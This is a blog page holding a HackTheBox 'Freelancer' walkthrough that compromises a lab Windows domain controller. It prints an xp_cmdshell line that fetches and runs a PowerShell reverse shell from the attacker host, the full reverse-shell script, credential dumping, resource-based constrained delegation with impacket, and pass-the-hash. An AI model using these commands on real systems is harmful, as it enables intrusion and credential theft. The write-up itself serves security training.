<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Freelancer Writeup - HackTheBox | Rezy Dev</title>
<meta name="keywords" content="HackTheBox, Windows, Hard">
<meta name="description" content="Freelancer is a hard Windows machine emphasizing real-world pentesting with IDOR, auth bypass, SQL impersonation, and RCE via SQL features. It culminates in advanced AD attacks using the Recycle Bin and Backup Operators group, plus memory forensics and AV evasion.">
<meta name="author" content="Me">
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/freelancer/">
<meta name="google-site-verification" content="XYZabc">
<meta name="yandex-verification" content="XYZabc">
<meta name="msvalidate.01" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/freelancer/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><style>
    @media screen and (min-width: 769px) {
         
        .post-content input[type="checkbox"]:checked ~ label > img {
            transform: scale(1.6);
            cursor: zoom-out;
            position: relative;
            z-index: 999;
        }
    
        .post-content img.zoomCheck {
            transition: transform 0.15s ease;
            z-index: 999;
            cursor: zoom-in;
        }
    }
    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/freelancer/">
  <meta property="og:site_name" content="Rezy Dev">
  <meta property="og:title" content="Freelancer Writeup - HackTheBox">
  <meta property="og:description" content="Freelancer is a hard Windows machine emphasizing real-world pentesting with IDOR, auth bypass, SQL impersonation, and RCE via SQL features. It culminates in advanced AD attacks using the Recycle Bin and Backup Operators group, plus memory forensics and AV evasion.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-10-11T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-10-11T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Windows">
    <meta property="article:tag" content="Hard">
    <meta property="og:image" content="http://localhost:1313/feature.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/feature.png">
<meta name="twitter:title" content="Freelancer Writeup - HackTheBox">
<meta name="twitter:description" content="Freelancer is a hard Windows machine emphasizing real-world pentesting with IDOR, auth bypass, SQL impersonation, and RCE via SQL features. It culminates in advanced AD attacks using the Recycle Bin and Backup Operators group, plus memory forensics and AV evasion.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "http://localhost:1313/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Freelancer Writeup - HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/freelancer/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Freelancer Writeup - HackTheBox",
  "name": "Freelancer Writeup - HackTheBox",
  "description": "Freelancer is a hard Windows machine emphasizing real-world pentesting with IDOR, auth bypass, SQL impersonation, and RCE via SQL features. It culminates in advanced AD attacks using the Recycle Bin and Backup Operators group, plus memory forensics and AV evasion.",
  "keywords": [
    "HackTheBox", "Windows", "Hard"
  ],
  "articleBody": " Link: https://app.hackthebox.com/machines/Freelancer Difficulty Hard Machine Windows Enumeration I ran nmap quickly to find open ports using: nmap 10.10.11.5 -T4 -vv\nPORT STATE SERVICE REASON 53/tcp open domain syn-ack 80/tcp open http syn-ack 88/tcp open kerberos-sec syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 389/tcp open ldap syn-ack 445/tcp open microsoft-ds syn-ack 464/tcp open kpasswd5 syn-ack 593/tcp open http-rpc-epmap syn-ack 636/tcp open ldapssl syn-ack 3268/tcp open globalcatLDAP syn-ack 3269/tcp open globalcatLDAPssl syn-ack With this open ports, I did agressive nmap scan using: sudo nmap 10.10.11.5 -T4 -vv -p53,80,88,135,139,389,445,464,593,636,3268,3269 -A -sC -sV -O\nPORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 nginx 1.25.5 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://freelancer.htb/ |_http-server-header: nginx/1.25.5 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-04 10:13:26Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.94SVN%E=4%D=6/4%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=665EA414%P=x86_64-pc-linux-gnu) SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U) OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS) WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70) ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=260 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4h53m57s | smb2-time: | date: 2024-06-04T10:13:40 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 53827/tcp): CLEAN (Timeout) | Check 2 (port 56435/tcp): CLEAN (Timeout) | Check 3 (port 55524/udp): CLEAN (Timeout) | Check 4 (port 39076/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required I added the freelancer.htb to /etc/hosts to make sure the site loads using echo \"10.10.11.5 freelancer.htb\" \u003e\u003e /etc/hosts\nThis is how the freelancer site looks:\nIn this site, we can create account for employer or freelancer.\nI created a freelancer user with following details:\n--\u003e freelancer info \u003c-- freelancer_rezy \u003e username mail@gmail.com \u003e email I will also create a account of employeer with following details:\n--\u003e employer info \u003c--- employercoo_l \u003e username erezrrrr1@gmail.com \u003e email sdlhjkgbfdjksjkskjsdhjkfs \u003e password fav movie \u003e spiderman pet \u003e dog friend's name \u003e john The site has note that, after creating account for employer we aren‚Äôt able to login as it will be reviewed before it is activated.\nI used the forget password functionality to change the password of the account employer to see if it allows us to login once we change the password. If yes the backend code has logic errors.\nIt worked and I changed the existing password to spiderman123! I tried to login with this new password, and it worked. I no more had to wait for review before accessing the site.\nLooking around the website, and my eye was caught this QR code.\nSo this link can let us login without using credentials.\nThe link is in the format: where the base64 encoded is just the userID and MD5 Hash is the token. Hash changes every 5 minutes or everytime we logout and relogin.\nFrom here I see that I can login to any user through this link as long as I know the id of the user I need to login, and the md5 token will be changed after each login.\nWe need to enumerate the userID of admin or any other user who might have any higher permission than what we have right now.\nI also found a comment to enumerate the users in this web app.\nI fuzzed the userId in this link: http://freelancer.htb/accounts/profile/visit/$userID$/ and found that ID 2 = admin user.\nNow, I will use the userID to login to user admin.\nUser Flag I visited the link: http://freelancer.htb/accounts/login/otp/Mg==/6c5f75d2ed26ceec004a2f5eb155fcfd/ to login to user admin. Here Mg== is the base64 encoded form of ‚Äú2‚Äù. And the md5 hash is just the token given from QR. I didn‚Äôt change it.\nAfter exploring a bit, I found nothing. Then I used gobuster to bruteforce the website and found /admin endpoint. As i am already the user admin, I was able to access it:\nHere, there is SQL Terminal in this admin endpoint. We can maybe try executing a code to get reverse shell from here.\nAs it is Windows box, it is most likely MSSQL. So, I will use the rev shelll script from: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands\nFirst I used to impersonate as user System Admin. (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users)\nEXECUTE AS LOGIN = 'sa' Then,\nsp_configure 'show advanced options', '1' RECONFIGURE sp_configure 'xp_cmdshell', '1' RECONFIGURE EXEC master..xp_cmdshell 'whoami' I can see it is sql_svc account.\nNow, I ran:\nEXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.14.72:8000/revshell.ps1)' This downloads the reverse shell powershell script from my kali machine to target machine.\nThe script contents the following script:\ndo { Start-Sleep -Seconds 1 try { $TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.72', 8888) } catch {} } until ($TCPClient.Connected) $NetworkStream = $TCPClient.GetStream() $StreamWriter = New-Object IO.StreamWriter($NetworkStream) function WriteToStream ($String) { [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0} $StreamWriter.Write($String + 'H3K3R-SHELL[#]\u003e ') $StreamWriter.Flush() } WriteToStream '' while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1) $Output = try { Invoke-Expression $Command 2\u003e\u00261 | Out-String } catch { $_ | Out-String }\tWriteToStream ($Output) } $StreamWriter.Close() We get a reverse shell now:\nAt users directory, i can see users in this box:\nAs i am sql_svc user, I will try to enumerate the user sql_svc to see if there is anything interesting.\nAt Directory: C:\\Users\\sql_svc\\Downloads\\SQLEXPR-2019_x64_ENU\nThere are following files:\nDirectory: C:\\Users\\sql_svc\\Downloads\\SQLEXPR-2019_x64_ENU Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/27/2024 1:52 PM 1033_ENU_LP d----- 5/27/2024 1:52 PM redist d----- 5/27/2024 1:52 PM resources d----- 5/27/2024 1:52 PM x64 -a---- 9/24/2019 9:00 PM 45 AUTORUN.INF -a---- 9/24/2019 9:00 PM 784 MEDIAINFO.XML -a---- 9/29/2023 4:49 AM 16 PackageId.dat -a---- 9/24/2019 9:00 PM 142944 SETUP.EXE -a---- 9/24/2019 9:00 PM 486 SETUP.EXE.CONFIG -a---- 5/27/2024 4:58 PM 724 sql-Configuration.INI -a---- 9/24/2019 9:00 PM 249448 SQLSETUPBOOTSTRAPPER.DLL Where, sql-Configuration.INI file contains the following configurations:\nSHELL\u003e cat sql-Configuration.INI [OPTIONS] ACTION=\"Install\" QUIET=\"True\" FEATURES=SQL INSTANCENAME=\"SQLEXPRESS\" INSTANCEID=\"SQLEXPRESS\" RSSVCACCOUNT=\"NT Service\\ReportServer$SQLEXPRESS\" AGTSVCACCOUNT=\"NT AUTHORITY\\NETWORK SERVICE\" AGTSVCSTARTUPTYPE=\"Manual\" COMMFABRICPORT=\"0\" COMMFABRICNETWORKLEVEL=\"\"0\" COMMFABRICENCRYPTION=\"0\" MATRIXCMBRICKCOMMPORT=\"0\" SQLSVCSTARTUPTYPE=\"Automatic\" FILESTREAMLEVEL=\"0\" ENABLERANU=\"False\" SQLCOLLATION=\"SQL_Latin1_General_CP1_CI_AS\" SQLSVCACCOUNT=\"FREELANCER\\sql_svc\" SQLSVCPASSWORD=\"IL0v3ErenY3ager\" Here, SQLSVCPASSWORD=\"IL0v3ErenY3ager\" is a password revealed. I will try to pass this password using crackmapexec to the users that were in users directory.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/htb/freelancer] ‚îî‚îÄ$ crackmapexec smb 10.10.11.5 -u users.txt -p IL0v3ErenY3ager SMB 10.10.11.5 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False) SMB 10.10.11.5 445 DC [-] freelancer.htb\\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE SMB 10.10.11.5 445 DC [-] freelancer.htb\\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE SMB 10.10.11.5 445 DC [-] freelancer.htb\\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE SMB 10.10.11.5 445 DC [+] freelancer.htb\\mikasaAckerman:IL0v3ErenY3ager As we can see the password for the user mikasaAckerman is IL0v3ErenY3ager.\nNow, I will upload runasCs to the box and try to inject the above credentials to the memory.\nTo upload runascs to my target machine, i will use command: Invoke-WebRequest \"http://10.10.14.72:8000/RunasCs.exe\" -OutFile \"runascs.exe\" to my current SHELL\u003e session.\nI ran nc -nvlp 6969 then ran ./runascs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.72:6969 on my current windows rev shell.\nI see myself as mikasaAckerman user. And the desktop of this user contains the user flag.\nRoot Flag In the desktop of mikasaAckerman, alongside user.txt there is also mail.txt which contains:\nHello Mikasa, I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the \"DATACENTER-2019\" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019. I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart. Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue. Best regards, There is also MEMORY.7Z here. I downloaded the 7z file from windows box to my linux machine using python impacket smb server.\nFirst I opened a smb server using command: impacket-smbserver share . -smb2support -user rezy -password rezy. And then mounted the share using:\n$SharePath = \"\\\\10.10.14.72\\share\" $Username = \"rezy\" $Password = \"rezy\" # Create a credential object $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, (ConvertTo-SecureString -String $Password -AsPlainText -Force) # Mount the SMB share net use Z: $SharePath $Password /user:$Username /persistent:no This will mount the smb share from linux to windows. Then to confirm I can do this:\nPS C:\\Users\\mikasaAckerman\\Desktop\u003e Get-PSDrive Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- Alias Alias C 13.67 1.79 FileSystem C:\\ Users\\Administrator\\Documents Cert Certificate \\ Env Environment Function Function HKCU Registry HKEY_CURRENT_USER HKLM Registry HKEY_LOCAL_MACHINE Variable Variable WSMan WSMan Z ...3478272.00 0.00 FileSystem \\\\10.10.14.72\\share As we can see it‚Äôs Z drive. I can simply run:\nCopy-Item -Path \"C:\\Users\\mikasaAckerman\\Desktop\\MEMORY.7z\" -Destination \"Z:\\\" to transfer file to the smb share and we can access it from our kali box.\nI then, used https://github.com/ufrisk/MemProcFS to dump the file and mount it.\nI found the SAM, SYSTEM and SECURITY files in registry/hive_files. I Dumped it with secretsdump and I get a password: PWN3D#l0rr@Armessa199 which is a password for the user lorra199\nI will login to it using evil-winrm -i freelancer.htb -u lorra199 -p PWN3D#l0rr@Armessa199\nNow, we need to syncronize the server time.\n‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali] ‚îî‚îÄ# ntpdate -u freelancer.htb 2024-06-06 09:45:20.815434 (-0400) +17631.477286 +/- 0.038578 freelancer.htb 10.10.11.5 s1 no-leap CLOCK: time stepped by 17631.477286 17631.477286 seconds is around 5 hours. So, I ran:\n‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali] ‚îî‚îÄ# faketime -f +5h bloodhound-python -c ALL -u lorra199 -p 'PWN3D#l0rr@Armessa199' -d freelancer.htb -ns 10.10.11.5 INFO: Found AD domain: freelancer.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.freelancer.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc.freelancer.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 13 computers INFO: Connecting to LDAP server: dc.freelancer.htb INFO: Found 30 users INFO: Found 58 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: SetupMachine.freelancer.htb INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: Datacenter-2019 INFO: Querying computer: DC.freelancer.htb WARNING: Could not resolve: Datacenter-2019: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.5@53 answered The DNS operation timed out. INFO: Done in 00M 17S This generated json files in the directory where we ran the command. This will be the file we will upload it to bloodhound and enumerate it to find path to root.\nIf you see the image above, lorra199 is member of AD REcycle bin group which has generic write permission to DC2.\nSo we can perform Resource Based Constrained Delegation, Using this a Domain admin can allow a computer to impersonate a user or computer against a service of a machine.\nI will now run,\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ impacket-addcomputer -computer-name 'HEKER$' -computer-pass 'Heker123@!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199' Impacket v0.11.0 - Copyright 2023 Fortra [*] Successfully added machine account HEKER$ with password Heker123@!. The impacket-addcomputer command is used to add a computer account to a domain\nNow we will use impacket rbcd to delegate:\nimpacket-rbcd -delegate-from 'HEKER$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199' delegate-from 'HEKER$': Specifies the computer account that will delegate permissions. In this case, it‚Äôs ‚ÄúHEKER$‚Äù. delegate-to 'DC$': Specifies the computer account that will receive the delegated permissions. In this case, it‚Äôs ‚ÄúDC$‚Äù. dc-ip 10.10.11.5: Specifies the IP address of the domain controller. In this case, it‚Äôs ‚Äú10.10.11.5‚Äù. action 'write': Specifies the action to be taken. In this case, it‚Äôs ‚Äúwrite‚Äù, which means it will write the delegation settings. 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199': Specifies the domain and credentials used to authenticate. In this case, it‚Äôs the ‚Äúfreelancer.htb‚Äù domain, with the username ‚Äúlorra199‚Äù and password ‚ÄúPWN3D#l0rr@Armessa199‚Äù. ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ impacket-rbcd -delegate-from 'HEKER$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199' Impacket v0.11.0 - Copyright 2023 Fortra [*] Accounts allowed to act on behalf of other identity: [*] rbcd_account$ (S-1-5-21-3542429192-2036945976-3483670807-11604) [*] parrot$ (S-1-5-21-3542429192-2036945976-3483670807-11601) [*] BIGNAMEMUST$ (S-1-5-21-3542429192-2036945976-3483670807-11605) [*] ATTACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11603) [*] WINGER$ (S-1-5-21-3542429192-2036945976-3483670807-11606) [*] WINGERABCDEFG$ (S-1-5-21-3542429192-2036945976-3483670807-11607) [*] ATTATTATTATTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11608) [*] HACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11609) [*] Delegation rights modified successfully! [*] HEKER$ can now impersonate users on DC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] rbcd_account$ (S-1-5-21-3542429192-2036945976-3483670807-11604) [*] parrot$ (S-1-5-21-3542429192-2036945976-3483670807-11601) [*] BIGNAMEMUST$ (S-1-5-21-3542429192-2036945976-3483670807-11605) [*] ATTACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11603) [*] WINGER$ (S-1-5-21-3542429192-2036945976-3483670807-11606) [*] WINGERABCDEFG$ (S-1-5-21-3542429192-2036945976-3483670807-11607) [*] ATTATTATTATTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11608) [*] HACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11609) [*] HEKER$ (S-1-5-21-3542429192-2036945976-3483670807-11610) Now we can see we are able to act on behalf of other identity. Now i will use impcket to get service ticket from dc.\nfaketime -f +5h impacket-getST -spn 'cifs/dc.freelncer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/HEKER$:'Heker123@!' i will now import the ticket and use secretsdump to get the hash of admin account.\nTo import the ticket, I will simply do export KRB5CCNAME=Administrator.ccache and run the following command:\nfaketime -f +5h impacket-secretsdump 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm We will recieve Hash for user accounts in this DC along with Administrator‚Äôs. Now, i will simply use the hash of Administrator and pass the hash with evil-winrm to get access to root account.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e whoami freelancer\\administrator As you can see, we got to administrator as well and got root flag too.\nConclusion Thanks for following my walk-through on this fun AD box.\n",
  "wordCount" : "2394",
  "inLanguage": "en",
  "image":"http://localhost:1313/feature.png","datePublished": "2024-10-11T00:00:00Z",
  "dateModified": "2024-10-11T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Me"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/writeups/hackthebox/freelancer/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rezy Dev",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about/" title="üë®üèº‚Äçüíª About">
                    <span>üë®üèº‚Äçüíª About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups/" title="‚úçÔ∏è Writeups">
                    <span>‚úçÔ∏è Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="üìÇ Archives">
                    <span>üìÇ Archives</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="üè∑Ô∏è Tags">
                    <span>üè∑Ô∏è Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="üîç Search (Alt &#43; /)" accesskey=/>
                    <span>üîç Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
    <h1 class="post-title entry-hint-parent">
      Freelancer Writeup - HackTheBox
    </h1>
    <div class="post-description">
      Freelancer is a hard Windows machine emphasizing real-world pentesting with IDOR, auth bypass, SQL impersonation, and RCE via SQL features. It culminates in advanced AD attacks using the Recycle Bin and Backup Operators group, plus memory forensics and AV evasion.
    </div>
    <div class="post-meta"><span title='2024-10-11 00:00:00 +0000 UTC'>October 11, 2024</span>&nbsp;¬∑&nbsp;12 min&nbsp;¬∑&nbsp;2394 words&nbsp;¬∑&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/Freelancer/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> 
<figure class="entry-cover">
            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/freelancer/feature.png" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a></li>
    <li><a href="#user-flag">User Flag</a></li>
    <li><a href="#root-flag">Root Flag</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><table>
  <thead>
      <tr>
          <th>Link:</th>
          <th><a href="https://app.hackthebox.com/machines/Freelancer">https://app.hackthebox.com/machines/Freelancer</a></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Difficulty</td>
          <td>Hard</td>
      </tr>
      <tr>
          <td>Machine</td>
          <td>Windows</td>
      </tr>
  </tbody>
</table>
<hr>
<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<p>I ran nmap quickly to find open ports using: <code>nmap 10.10.11.5 -T4 -vv</code></p>
<pre tabindex="0"><code>PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack
80/tcp   open  http             syn-ack
88/tcp   open  kerberos-sec     syn-ack
135/tcp  open  msrpc            syn-ack
139/tcp  open  netbios-ssn      syn-ack
389/tcp  open  ldap             syn-ack
445/tcp  open  microsoft-ds     syn-ack
464/tcp  open  kpasswd5         syn-ack
593/tcp  open  http-rpc-epmap   syn-ack
636/tcp  open  ldapssl          syn-ack
3268/tcp open  globalcatLDAP    syn-ack
3269/tcp open  globalcatLDAPssl syn-ack
</code></pre><p>With this open ports, I did agressive nmap scan using: <code>sudo nmap 10.10.11.5 -T4 -vv -p53,80,88,135,139,389,445,464,593,636,3268,3269 -A -sC -sV -O</code></p>
<pre tabindex="0"><code>PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 nginx 1.25.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://freelancer.htb/
|_http-server-header: nginx/1.25.5
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-04 10:13:26Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
